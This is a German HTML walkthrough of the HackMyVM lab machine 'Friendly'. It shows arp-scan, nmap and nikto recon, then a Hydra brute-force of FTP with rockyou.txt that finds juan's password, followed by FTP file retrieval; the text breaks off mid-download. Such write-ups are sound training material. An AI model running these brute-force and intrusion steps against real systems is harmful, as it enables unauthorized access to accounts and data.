<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Friendly - HackMyVM - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
 <div class="nav-wrapper">
    <div class="hamburger-nav-wrapper">
        <input type="checkbox" id="hamburger-toggle">
        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
            <div class="bar"></div>
            <div class="bar"></div>
            <div class="bar"></div>
        </label>

        <nav class="navbar" id="main-nav">
            <a href="../../aboutme.html">Über mich</a>
            <a href="../../index.html">HackMyVM</a>
            <a href="../../vulnyx.html">Vulnyx</a>
            <a href="../../vulnhub.html">Vulnhub</a>
        </nav>
  </div></div>
    <div class="header-bg">
        <h1>Friendly - HackMyVM - Level: Easy - Bericht</h1>
        <div class="level-container">
            <h2 class="easy-level">Easy</h2>
            <div class="circle easy-level-circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">wappalyzer</div>
                <div class="tool-item">hydra</div>
                <div class="tool-item">ftp</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">cat</div>
                <div class="tool-item">find</div>
                <div class="tool-item">id</div>
                <div class="tool-item">uname</div>
                <div class="tool-item">ssh</div>
                <div class="tool-item">echo</div>
                <div class="tool-item">cp</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                 <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p>
                Zu Beginn jedes Penetrationstests führe ich die Erkundungsphase durch. Mein erstes Ziel ist es, das System "Friendly" im lokalen Netzwerk zu lokalisieren, um seine IP-Adresse zu bestimmen.
            </p>

            <div class="code-block">
                <div class="terminal">
                    <!-- Kein Prompt im Original, da Textblock-Stil -->
                    <pre>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

<span class="command">192.168.2.59</span>	08:00:27:d9:10:df	<span class="command">PCS Systemtechnik GmbH</span>
</pre>
                </div>
            </div>
            <p>
                Durch einen ARP-Scan meines lokalen Netzwerks konnte ich das Zielsystem schnell identifizieren. Die IP-Adresse <span class="command">192.168.2.59</span> antwortete, und die zugehörige MAC-Adresse deutet auf eine virtuelle Maschine von <span class="command">PCS Systemtechnik GmbH</span> hin. Dies ist nun mein Ziel für die weiteren Schritte.
            </p>

            <p>
                Um die Arbeit mit der Ziel-IP-Adresse zu vereinfachen, füge ich einen Eintrag in meine lokale Hosts-Datei hinzu, sodass ich das System über einen aussagekräftigen Hostnamen ansprechen kann.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <!-- Kein Prompt im Original, da Textblock-Stil -->
                    <pre>
___________________________________________________________________________________________________________________

<span class="command">/etc/hosts</span>...
                <span class="command">192.168.2.59   friendly.hmv</span>
</pre>
                </div>
            </div>
             <p>
                Ich habe die Zeile <code>192.168.2.59 friendly.hmv</code> zu meiner lokalen <code>/etc/hosts</code> Datei hinzugefügt. Dies ermöglicht es mir, im weiteren Verlauf des Tests den Hostnamen <code>friendly.hmv</code> zu verwenden, was die Befehle und die Dokumentation übersichtlicher gestaltet.
            </p>

            <p>
                Nachdem das Ziel identifiziert ist, führe ich einen umfassenden Nmap-Scan durch, um alle offenen TCP-Ports und die darauf laufenden Dienste zu erkennen. Dies gibt mir einen Überblick über die verfügbaren Angriffsflächen.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.59</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
Starting Nmap 7.95 ( https://nmap.org ) at <span class="password">2025-06-24 12:43 CEST</span>
<span class="command">Nmap scan report <span class="command">for</span> <span class="command">friendly.hmv (192.168.2.59)</span></span>
<span class="command">Host is up (0.00013s latency)</span>.
Not shown: <span class="command">65532</span> <span class="command">closed</span> tcp <span class="command">ports</span> (reset)
<span class="command">PORT</span>   STATE SERVICE VERSION
<span class="command">21/tcp <span class="command">open</span>  ftp     vsftpd 3.0.3</span>
<span class="command">22/tcp <span class="command">open</span>  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
| ssh-<span class="command">hostkey</span>:
|   <span class="command">256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)</span>
|_  <span class="command">256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)</span>
<span class="command">80/tcp <span class="command">open</span>  http    nginx 1.22.1</span>
|_http-server-header: <span class="command">nginx/1.22.1</span>
|_http-title: <span class="command">Welcome to nginx!</span>
<span class="command">MAC Address: 08:00:27:D9:10:DF (PCS Systemtechnik/Oracle <span class="command">VirtualBox</span> <span class="command">virtual</span> NIC)</span>
Device type: general purpose
Running: <span class="command">Linux 4.X|5.X</span>
<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
<span class="command">OS details: Linux 4.15 - 5.19</span>
<span class="command">Network Distance: 1 <span class="command">hop</span></span>
<span class="command">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span>

TRACEROUTE
<span class="command">HOP</span> RTT     ADDRESS
<span class="command">1   0.13 ms friendly.hmv (192.168.2.59)</span>

<span class="command">OS</span> and Service detection <span class="command">performed</span>. Please <span class="command">report</span> any incorrect results at https://nmap.org/submit/ .
<span class="command">Nmap <span class="command">done</span>: 1 IP address (1 <span class="command">host</span> up) scanned in 14.50 <span class="command">seconds</span></span>
</pre>
                 </div>
             </div>
             <p>
                 Der Nmap-Scan war sehr aufschlussreich. Er identifizierte drei offene TCP-Ports: <span class="command">21/tcp</span>, auf dem <code>vsftpd 3.0.3</code> läuft, <span class="command">22/tcp</span> mit <code>OpenSSH 9.2p1</code> und <span class="command">80/tcp</span> mit <code>nginx 1.22.1</code>. Die Versionen der Dienste sind wichtig für die Suche nach bekannten Schwachstellen. Der HTTP-Dienst zeigt den Titel "Welcome to nginx!". Die OS-Erkennung deutet auf ein Linux-System hin. Diese drei Dienste sind meine Hauptziele für den Initial Access.
             </p>

            <p>
                Um die HTTP-Anwendung auf Port 80 genauer zu prüfen und gängige Web-Schwachstellen zu identifizieren, setze ich das Tool Nikto ein.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://192.168.2.59</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="command">192.168.2.59</span>
+ Target Hostname:    <span class="command">192.168.2.59</span>
+ Target <span class="command">Port</span>:        <span class="command">80</span>
+ Start Time:         <span class="password">2025-06-24 12:44:09 (GMT2)</span>
---------------------------------------------------------------------------
+ Server: <span class="command">nginx/1.22.1</span>
+ <span class="command">/: The anti-clickjacking X-Frame-Options header is not present</span>. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
+ <span class="command">/: The X-Content-Type-Options header is not set</span>. This could allow the user agent to render the content <span class="command">of</span> the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
+ No CGI Directories <span class="password">found</span> (use '-C all' to <span class="command">force</span> check all possible dirs)
+ <span class="command">/#wp-config.php#: #wp-config.php# file <span class="password">found</span>. This file <span class="password">contains</span> the credentials</span>.
+ <span class="command">8102</span> requests: <span class="password">0 errors and 3 items <span class="command">reported</span> <span class="command">on</span> <span class="command">remote</span> <span class="command">host</span></span>
+ End Time:           <span class="password">2025-06-24 12:44:34 (GMT2) (25 <span class="command">seconds</span>)</span>
---------------------------------------------------------------------------
+ <span class="command">1 <span class="command">host</span>(s) tested</span>
</pre>
                 </div>
             </div>
             <p>
                Der Nikto-Scan auf dem nginx-Webserver meldete einige fehlende Sicherheitsheader, was typische Härtungsdefizite sind. Viel interessanter war jedoch der Hinweis auf die Existenz einer Datei namens <span class="command">#wp-config.php#</span>. Obwohl der Server nginx und der Titel "Welcome to nginx!" zeigt, könnte dieser Fund auf eine versteckte WordPress-Installation hindeuten, da <code>wp-config.php</code> die Konfigurationsdatei von WordPress ist, die oft Datenbank-Zugangsdaten enthält.
             </p>

            <p>
                Um den tatsächlichen Inhalt der Hauptseite und eventuell versteckte Informationen zu prüfen, rufe ich die Seite direkt im Browser (oder mit curl) auf.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <!-- Kein Prompt im Original, da Textblock-Stil -->
                    <pre>
__________________________________________________________________________________________________________________

<span class="command">http://192.168.2.59/</span>

<span class="command">Welcome to nginx!</span>

<span class="password">Hi, sysadmin</span>
<span class="password">I want y<span class="command">ou</span> to know that I've just uploaded the new files <span class="command">into</span> the FTP Server</span>.
<span class="password">See y<span class="command">ou</span>,</span>
<span class="password">juan</span>.
</pre>
                </div>
            </div>
             <p>
                Der direkte Aufruf der Webseite zeigte nicht nur die Standard "Welcome to nginx!" Seite, sondern enthüllte auch eine versteckte Nachricht: "<span class="password">Hi, sysadmin I want you to know that I've just uploaded the new files into the FTP Server. See you, juan.</span>". Diese Notiz ist ein entscheidender Hinweis! Sie nennt den Benutzer "juan" und erwähnt das Hochladen von Dateien auf den FTP-Server. Dies lenkt meinen Fokus klar auf den FTP-Dienst auf Port 21 und einen möglichen Benutzernamen.
            </p>

            <p>
                Um die auf der Webseite verwendeten Technologien genauer zu analysieren, nutze ich Wappalyzer.
            </p>
             <div class="code-block">
                <div class="terminal">
                     <!-- Kein Prompt im Original -->
                    <pre>
<span class="command">wappalyzer</span>

Reverse <span class="command">Proxies</span> Nginx <span class="command">1.22.1</span>
     Web Server nginx <span class="command">1.22.1</span>
</pre>
                </div>
            </div>
            <p>
                Wappalyzer bestätigt, dass nginx in Version 1.22.1 als Webserver läuft. Die zusätzliche Erkennung von "Reverse Proxies" ist interessant, aber die primäre Technologie auf Port 80 ist nginx.
            </p>
             <p class="comment">
                 Basierend auf der Notiz auf der Webseite, die den Benutzer "juan" und den FTP-Server erwähnt, werde ich nun versuchen, mich mit dem Benutzernamen "juan" am FTP-Dienst auf Port 21 anzumelden. Da ich kein Passwort habe, versuche ich, es mit einer gängigen Passwortliste zu erraten (Brute-Force).
             </p>
        </section>
        </section>
        <!-- Ende Reconnaissance Section -->

        <section id="initial-access">
            <h2>Initial Access</h2>
             <p>
                 Die versteckte Notiz auf der Webseite war ein entscheidender Fund. Sie lenkte meine Aufmerksamkeit direkt auf den FTP-Dienst auf Port 21 und nannte explizit den Benutzernamen "juan". Dies ist ein starker Hinweis für den Initial Access. Mein nächster Schritt ist es nun, ein passendes Passwort für diesen Benutzer auf dem FTP-Server zu finden. Da ich kein Passwort kenne, werde ich einen gezielten Brute-Force-Angriff mit Hydra und einer gängigen Passwortliste versuchen, basierend auf dem gefundenen Benutzernamen.
             </p>

             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.59 -t 64</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
Hydra v9.5 (c) <span class="command">2023</span> by van Hauser/THC & David Maciejak - Please <span class="command">do</span> not use in military <span class="command">or</span> secret service <span class="command">organizations</span>, <span class="command">or</span> <span class="command">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra ([Link: https://github.com/vanhauser-thc/thc-Hydra | Ziel: https://github.com/vanhauser-thc/thc-Hydra]) starting at <span class="password">2025-06-24 12:46:53</span>
<span class="password">[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344500 login tries (l:1/p:14344500), ~224133 tries per task</span>
<span class="password">[DATA] attacking ftp://192.168.2.59:21/</span>
<span class="password">[21][ftp] <span class="command">host</span>: <span class="command">192.168.2.59</span>   login: <span class="password">juan</span>   password: <span class="password">alexis</span></span> <-- ERFOLG!
<span class="password">1 <span class="command">of</span> 1 target successfully <span class="password">completed</span>, 1 <span class="command">valid</span> password <span class="password">found</span></span>
Hydra ([Link: https://github.com/vanhauser-thc/thc-Hydra | Ziel: https://github.com/vanhauser-thc/thc-Hydra]) finished at <span class="password">2025-06-24 12:47:27</span>
</pre>
                 </div>
             </div>
             <p>
                 Ich habe Hydra mit dem Benutzernamen "juan" und der umfangreichen <code>rockyou.txt</code> Wordlist gegen den FTP-Dienst auf <code>192.168.2.59</code> laufen lassen. Glücklicherweise war der Brute-Force-Versuch schnell erfolgreich! Hydra fand ein gültiges Passwort für den Benutzer "juan": "<span class="password">alexis</span>". Dies verschafft mir den ersten Zugriff auf den FTP-Server.
             </p>

             <p>
                 Mit dem Benutzernamen "juan" und dem Passwort "alexis" kann ich mich nun am FTP-Server anmelden und das Dateisystem erkunden, insbesondere auf der Suche nach den "neuen Dateien", die in der Notiz auf der Webseite erwähnt wurden.
             </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">ftp 192.168.2.59</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
<span class="password">Connected to 192.168.2.59</span>.
<span class="password">220 (vsFTPd 3.0.3)</span>
Name (<span class="command">192.168.2.59</span>:ccat): <span class="password">juan</span>
<span class="password">331 Please specify the password</span>.
Password: <span class="password">alexis</span>
<span class="password">230 Login successful</span>.
<span class="password">Remote</span> system type is UNIX.
Using binary <span class="command">mode</span> to transfer files.
ftp> <span class="command">ls -al</span>
<span class="password">229 Entering Extended Passive Mode (|||29140|)</span>
<span class="password">150 Here comes the directory listing</span>.
drwxr-xr-x   14 0        0            4096 Jun 25  2023 .
drwxr-xr-x   14 0        0            4096 Jun 25  2023 ..
-rw-r--r--    1 0        0               0 Jun 25  2023 file1
-rw-r--r--    1 0        0               0 Jun 25  2023 file10
-rw-r--r--    1 0        0               0 Jun 25  2023 file100
-rw-r--r--    1 0        0               0 Jun 25  2023 file11
-rw-r--r--    1 0        0               0 Jun 25  2023 file12
-rw-r--r--    1 0        0               0 Jun 25  2023 file13
-rw-r--r--    1 0        0               0 Jun 25  2023 file14
-rw-r--r--    1 0        0               0 Jun 25  2023 file15
-rw-r--r--    1 0        0               0 Jun 25  2023 file16
-rw-r--r--    1 0        0               0 Jun 25  2023 file17
-rw-r--r--    1 0        0               0 Jun 25  2023 file18
-rw-r--r--    1 0        0               0 Jun 25  2023 file19
-rw-r--r--    1 0        0               0 Jun 25  2023 file2
-rw-r--r--    1 0        0               0 Jun 25  2023 file20
-rw-r--r--    1 0        0               0 Jun 25  2023 file21
-rw-r--r--    1 0        0               0 Jun 25  2023 file22
-rw-r--r--    1 0        0               0 Jun 25  2023 file23
-rw-r--r--    1 0        0               0 Jun 25  2023 file24
-rw-r--r--    1 0        0               0 Jun 25  2023 file25
-rw-r--r--    1 0        0               0 Jun 25  2023 file26
-rw-r--r--    1 0        0               0 Jun 25  2023 file27
-rw-r--r--    1 0        0               0 Jun 25  2023 file28
-rw-r--r--    1 0        0               0 Jun 25  2023 file29
-rw-r--r--    1 0        0               0 Jun 25  2023 file3
-rw-r--r--    1 0        0               0 Jun 25  2023 file30
-rw-r--r--    1 0        0               0 Jun 25  2023 file31
-rw-r--r--    1 0        0               0 Jun 25  2023 file32
-rw-r--r--    1 0        0               0 Jun 25  2023 file33
-rw-r--r--    1 0        0               0 Jun 25  2023 file34
-rw-r--r--    1 0        0               0 Jun 25  2023 file35
-rw-r--r--    1 0        0               0 Jun 25  2023 file36
-rw-r--r--    1 0        0               0 Jun 25  2023 file37
-rw-r--r--    1 0        0               0 Jun 25  2023 file38
-rw-r--r--    1 0        0               0 Jun 25  2023 file39
-rw-r--r--    1 0        0               0 Jun 25  2023 file4
-rw-r--r--    1 0        0               0 Jun 25  2023 file40
-rw-r--r--    1 0        0               0 Jun 25  2023 file41
-rw-r--r--    1 0        0               0 Jun 25  2023 file42
-rw-r--r--    1 0        0               0 Jun 25  2023 file43
-rw-r--r--    1 0        0               0 Jun 25  2023 file44
-rw-r--r--    1 0        0               0 Jun 25  2023 file45
-rw-r--r--    1 0        0               0 Jun 25  2023 file46
-rw-r--r--    1 0        0               0 Jun 25  2023 file47
-rw-r--r--    1 0        0               0 Jun 25  2023 file48
-rw-r--r--    1 0        0               0 Jun 25  2023 file49
-rw-r--r--    1 0        0               0 Jun 25  2023 file5
-rw-r--r--    1 0        0               0 Jun 25  2023 file50
-rw-r--r--    1 0        0               0 Jun 25  2023 file51
-rw-r--r--    1 0        0               0 Jun 25  2023 file52
-rw-r--r--    1 0        0               0 Jun 25  2023 file53
-rw-r--r--    1 0        0               0 Jun 25  2023 file54
-rw-r--r--    1 0        0               0 Jun 25  2023 file55
-rw-r--r--    1 0        0               0 Jun 25  2023 file56
-rw-r--r--    1 0        0               0 Jun 25  2023 file57
-rw-r--r--    1 0        0               0 Jun 25  2023 file58
-rw-r--r--    1 0        0               0 Jun 25  2023 file59
-rw-r--r--    1 0        0               0 Jun 25  2023 file6
-rw-r--r--    1 0        0               0 Jun 25  2023 file60
-rw-r--r--    1 0        0               0 Jun 25  2023 file61
-rw-r--r--    1 0        0               0 Jun 25  2023 file62
-rw-r--r--    1 0        0               0 Jun 25  2023 file63
-rw-r--r--    1 0        0               0 Jun 25  2023 file64
-rw-r--r--    1 0        0               0 Jun 25  2023 file65
-rw-r--r--    1 0        0               0 Jun 25  2023 file66
-rw-r--r--    1 0        0               0 Jun 25  2023 file67
-rw-r--r--    1 0        0               0 Jun 25  2023 file68
-rw-r--r--    1 0        0               0 Jun 25  2023 file69
-rw-r--r--    1 0        0               0 Jun 25  2023 file7
-rw-r--r--    1 0        0               0 Jun 25  2023 file70
-rw-r--r--    1 0        0               0 Jun 25  2023 file71
-rw-r--r--    1 0        0               0 Jun 25  2023 file72
-rw-r--r--    1 0        0               0 Jun 25  2023 file73
-rw-r--r--    1 0        0               0 Jun 25  2023 file74
-rw-r--r--    1 0        0               0 Jun 25  2023 file75
-rw-r--r--    1 0        0               0 Jun 25  2023 file76
-rw-r--r--    1 0        0               0 Jun 25  2023 file77
-rw-r--r--    1 0        0               0 Jun 25  2023 file78
-rw-r--r--    1 0        0               0 Jun 25  2023 file79
-rw-r--r--    1 0        0               0 Jun 25  2023 file8
-rw-r--r--    1 0        0              36 Jun 25  2023 file80
-rw-r--r--    1 0        0               0 Jun 25  2023 file81
-rw-r--r--    1 0        0               0 Jun 25  2023 file82
-rw-r--r--    1 0        0               0 Jun 25  2023 file83
-rw-r--r--    1 0        0               0 Jun 25  2023 file84
-rw-r--r--    1 0        0               0 Jun 25  2023 file85
-rw-r--r--    1 0        0               0 Jun 25  2023 file86
-rw-r--r--    1 0        0               0 Jun 25  2023 file87
-rw-r--r--    1 0        0               0 Jun 25  2023 file88
-rw-r--r--    1 0        0               0 Jun 25  2023 file89
-rw-r--r--    1 0        0               0 Jun 25  2023 file9
-rw-r--r--    1 0        0               0 Jun 25  2023 file90
-rw-r--r--    1 0        0               0 Jun 25  2023 file91
-rw-r--r--    1 0        0               0 Jun 25  2023 file92
-rw-r--r--    1 0        0               0 Jun 25  2023 file93
-rw-r--r--    1 0        0               0 Jun 25  2023 file94
-rw-r--r--    1 0        0               0 Jun 25  2023 file95
-rw-r--r--    1 0        0               0 Jun 25  2023 file96
-rw-r--r--    1 0        0               0 Jun 25  2023 file97
-rw-r--r--    1 0        0               0 Jun 25  2023 file98
-rw-r--r--    1 0        0               0 Jun 25  2023 file99
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold10</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold11</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold12</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold13</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold14</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold15</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold4</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold5</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold6</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold7</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold8</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold9</span>
-rw-r--r--    1 0        0              58 Jun 25  2023 <span class="command">file32</span>


___________________________________________________________________________________________________________________

ftp> <span class="command">ls file*</span>
.....
....
...
-rw-r--r--    1 0        0              36 Jun 25  2023 <span class="command">file80</span>
...
..
.

-------------------------------------------------------------------------------------------------------------------

ftp> <span class="command">get file80</span>
<span class="password">local: file80 remote: file80</span>
<span class="password">229 Entering Extended Passive Mode (|||10221|)</span>
<span class="password">150 Opening BINARY <span class="command">mode</span> <span class="command">data</span> <span class="command">connection</span> <span class="command">for</span> file80 (36 <span class="command">bytes</span>)</span>.
<span class="password">100% |*************************************************|    36      134.69 KiB/s    00:00 ETA</span>
<span class="password">226 Transfer <span class="password">complete</span></span>.
<span class="password">36 <span class="command">bytes</span> <span class="password">received</span> in 00:00 (76.42 KiB/s)</span>

┌──(root㉿CCat)-[~]
└─# <span class="command">cat file80</span>
<span class="password">Hi, I'm the sysadmin. I am bored...</span>

___________________________________________________________________________________________________________________

</pre>
                 </div>
             </div>
             <p>
                 Nachdem ich mich erfolgreich als Benutzer "juan" am FTP-Server angemeldet habe, liste ich den Inhalt des aktuellen Verzeichnisses auf (<code>ls -al</code>). Ich sehe eine große Anzahl von Dateien, benannt von <code>file1</code> bis <code>file100</code> (obwohl nicht alle 100 existieren oder gelistet wurden) und mehrere Unterverzeichnisse mit Namen wie <code>fold4</code> bis <code>fold15</code>. Die Dateiberechtigungen (<code>-rw-r--r--</code>) und die Besitzerinformationen (UID 0, GID 0) deuten darauf hin, dass die Dateien Root gehören und für den Besitzer (Root) schreibbar, für die Gruppe und alle anderen lesbar sind. Als Benutzer 'juan' kann ich sie also lesen.
            </p>
            <p>
                Ich habe die Dateiliste genauer betrachtet, insbesondere die Größen. Ein einfacher <code>ls file*</code> Befehl (im Originaltext abgekürzt dargestellt) bestätigte die Existenz der "file"-Serie. Dabei fiel mir auf, dass die Datei <code>file80</code> eine Größe von 36 Bytes hat, während die meisten anderen Dateien eine Größe von 0 Bytes haben. Dies macht <code>file80</code> verdächtig.
            </p>
            <p>
                Ich habe die Datei <code>file80</code> vom FTP-Server auf meine Angreifer-Maschine heruntergeladen. Nach dem erfolgreichen Transfer habe ich den Inhalt der Datei mit <code>cat</code> gelesen. Die Datei enthielt die Nachricht: "<span class="password">Hi, I'm the sysadmin. I am bored...</span>". Dies scheint eine weitere Nachricht vom Systemadministrator zu sein, die aber keine direkten Zugangsdaten oder Hinweise auf eine Schwachstelle enthält.
            </p>
        </section>





            </p>
        </section>
        <!-- Ende Initial Access Section -->

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <p>
                Nachdem der Inhalt von <code>file80</code> keine direkten Zugangsdaten lieferte, setze ich meine Erkundung der Verzeichnisse auf dem FTP-Server fort. Ich habe bemerkt, dass es mehrere Ordner gibt, die mit "fold" beginnen und durchnummeriert sind. Es ist wahrscheinlich, dass sich in einem dieser Ordner weitere interessante Dateien befinden.
            </p>

            <div class="code-block">
                <div class="terminal">
                    <!-- Keine Prompt im Original, da FTP-Session -->
                    <pre>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold10</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold11</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold12</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold13</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold14</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold15</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold4</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold5</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold6</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold7</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold8</span>
drwxr-xr-x    2 0        0            4096 Jun 25  2023 <span class="command">fold9</span>
-rw-r--r--    1 0        0              58 Jun 25  2023 <span class="command">file32</span>

ftp> <span class="command">cd fold10</span>
<span class="password">250 Directory successfully changed</span>.
ftp> <span class="command">ls -la</span>
<span class="password">229 Entering Extended Passive Mode (|||10060|)</span>
<span class="password">150 Here comes the directory listing</span>.
drwxr-xr-x    2 0        0            4096 Jun 25  2023 .
drwxr-xr-x   14 0        0            4096 Jun 25  2023 ..
-rw-r--r--    1 0        0             163 Jun 25  2023 <span class="command">.test.txt</span>
<span class="password">226 Directory send OK</span>.
ftp> <span class="command">get .test.txt testftp.txt</span>
<span class="password">local: testftp.txt remote: .test.txt</span>
<span class="password">229 Entering Extended Passive Mode (|||33738|)</span>
<span class="password">150 Opening BINARY <span class="command">mode</span> <span class="command">data</span> <span class="command">connection</span> <span class="command">for</span> .test.txt (163 <span class="command">bytes</span>)</span>.
<span class="password">100% |*************************************************|   163      566.47 KiB/s    00:00 ETA</span>
<span class="password">226 Transfer <span class="password">complete</span></span>.

┌──(root㉿CCat)-[~]
└─# <span class="command">cat testftp.txt</span>
<span class="password">Hi, I'am juan another time. I want y<span class="command">ou</span> to know that I <span class="password">found</span> "cookie" </span>
<span class="password">in a file called "zlcnffjbeq.gkg" <span class="command">into</span> my <span class="command">home</span> f<span class="command">o</span>lder. I think it's </span>
<span class="password"><span class="command">from</span> another user, IDK...</span>

ftp> <span class="command">cd fold5</span>
<span class="password">250 Directory successfully changed</span>.
ftp> <span class="command">ls -la</span>
<span class="password">229 Entering Extended Passive Mode (|||26622|)</span>
<span class="password">150 Here comes the directory listing</span>.
drwxr-xr-x    2 0        0            4096 Jun 25  2023 .
drwxr-xr-x   14 0        0            4096 Jun 25  2023 ..
-rw-r--r--    1 0        0              33 Jun 25  2023 <span class="command">yt.txt</span>
<span class="password">226 Directory send OK</span>.
ftp> <span class="command">get yt.txt</span>
<span class="password">local: yt.txt remote: yt.txt</span>
<span class="password">229 Entering Extended Passive Mode (|||16129|)</span>
<span class="password">150 Opening BINARY <span class="command">mode</span> <span class="command">data</span> <span class="command">connection</span> <span class="command">for</span> yt.txt (33 <span class="command">bytes</span>)</span>.
<span class="password">100% |*************************************************|    33      266.33 KiB/s    00:00 ETA</span>
<span class="password">226 Transfer <span class="password">complete</span></span>.
<span class="password">33 <span class="command">bytes</span> <span class="password">received</span> in 00:00 (72.74 KiB/s)</span>
ftp>

┌──(root㉿CCat)-[~]
└─# <span class="command">cat yt.txt</span>
<span class="password">Thanks to all my YT subscribers!</span>
<span class="password">                                   </span>

ftp> <span class="command">cd fold8</span>
<span class="password">250 Directory successfully changed</span>.
ftp> <span class="command">ls -la</span>
<span class="password">229 Entering Extended Passive Mode (|||44727|)</span>
<span class="password">150 Here comes the directory listing</span>.
drwxr-xr-x    2 0        0            4096 Jun 25  2023 .
drwxr-xr-x   14 0        0            4096 Jun 25  2023 ..
-rw-r--r--    1 0        0            3171 Jun 25  2023 <span class="command">passwd.txt</span>
<span class="password">226 Directory send OK</span>.

ftp> <span class="command">get passwd.txt friendlypasswd.txt</span>
<span class="password">local: friendlypasswd.txt remote: passwd.txt</span>
<span class="password">229 Entering Extended Passive Mode (|||44723|)</span>
<span class="password">150 Opening BINARY <span class="command">mode</span> <span class="command">data</span> <span class="command">connection</span> <span class="command">for</span> passwd.txt (3171 <span class="command">bytes</span>)</span>.
